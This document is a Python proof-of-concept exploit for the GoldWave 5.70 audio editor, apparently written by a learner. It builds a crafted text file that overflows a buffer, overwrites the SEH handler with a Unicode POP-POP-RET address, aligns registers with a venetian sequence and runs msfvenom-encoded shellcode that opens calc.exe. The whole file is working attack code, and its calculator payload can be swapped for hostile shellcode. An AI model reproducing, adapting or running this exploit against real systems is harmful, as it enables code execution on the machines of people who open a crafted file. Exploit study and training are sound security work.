from struct import pack

# Log data, item 14
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018f730 overwritten with unicode pattern : 0x00420039 (offset 1019), followed by 1124 bytes of cyclic data after the handler

# 0x006d000f : pop ecx # pop ebp # ret  | startnull,unicode,ascii {PAGE_EXECUTE_READ}
# [GoldWave.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.70.0.0(C:\Program Files (x86)\GoldWave\GoldWave.exe)

nseh = "\x61\x62" # overwrite next SEH with POPAD, this also populates all registers
seh = "\x0f\x6d" # Unicode POP POP RETN from GoldWave.exe 

# ebx is the register closest to our shellcode following the popad 
# maybe
# took the venetian alignment from https://nutcrackerssecurity.github.io/Windows5.html 
# because i'm still learning to understand this
venetian_alignment = (
"\x53" 					#push ebx
"\x47" 					#align
"\x58" 					#pop eax
"\x47" 					#align
"\x05\x16\x11" 	                        #add eax,600  
"\x47"					#align
"\x2d\x13\x11"	                        #sub eax,300
"\x47"					#align
"\x50"					#push eax
"\x47"					#align
"\xc3"					#retn
)

# /msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_upper BufferRegister=EAX -v shellcode_calc EXITFUNC=seh
shellcode_calc  = "PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1"
shellcode_calc += "AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB9"
shellcode_calc += "44JBKLJH3RM0M0M01PE9JE01Y02DTKPPNPTKB2LL4KR2MDTKD2O8LOX70JMVNQKOFLO"
shellcode_calc += "L1QCLM2NLMPWQXOLMKQHGJBZRQBPWTK0RN0TKOZOL4K0LN1T8IS0HM1XQ21DKR9MPKQ"
shellcode_calc += "Z3TKOYLXISNZ194KOD4KM18VP1KOFLWQXOLMKQ97P8K0BUKFM3CMKHOK3MND45YT0XT"
shellcode_calc += "K1HO4KQXSC6TKLLPKTKQHMLM1J3TKLD4KM1XP3YQ4O4ND1KQK31PYPZB1KOYPQO1OPZ"
shellcode_calc += "4KN2JKDMQMQZM1DM3U7BKPM0KP0PS8P1TKBOE7KOZ57KKNLNNRIZ1XUV65WMEMKOJ5O"
shellcode_calc += "LM6SLLJE0KK9PCEKUWKOWMCSBRO2JKPR3KO9ERC1QRL1SNN1U3H35M0AA"

payload = "\x41" * 1019
payload += nseh
payload += seh
payload += venetian_alignment
payload += "\x90" * 365
payload += shellcode_calc
payload += "D" * 8000

try:
    print("[x] Goldwave 5.70 SEH + unicode bypass exploit\n")
    exploit_create = open("goldwave_exploit.txt", "w")
    print("[x] Creating goldwave_exploit.txt")
    exploit_create.write(payload)
    print("[x] Adding malicious payload to the file")
    print("[x] Adding venterian alignment to the payload")
    print("[x] Adding calculator shellcode to the payload")
    print("[x] Poppppppppppped calc")
    exploit_create.close()
except:
    print("[!] Error creating malicious payload")
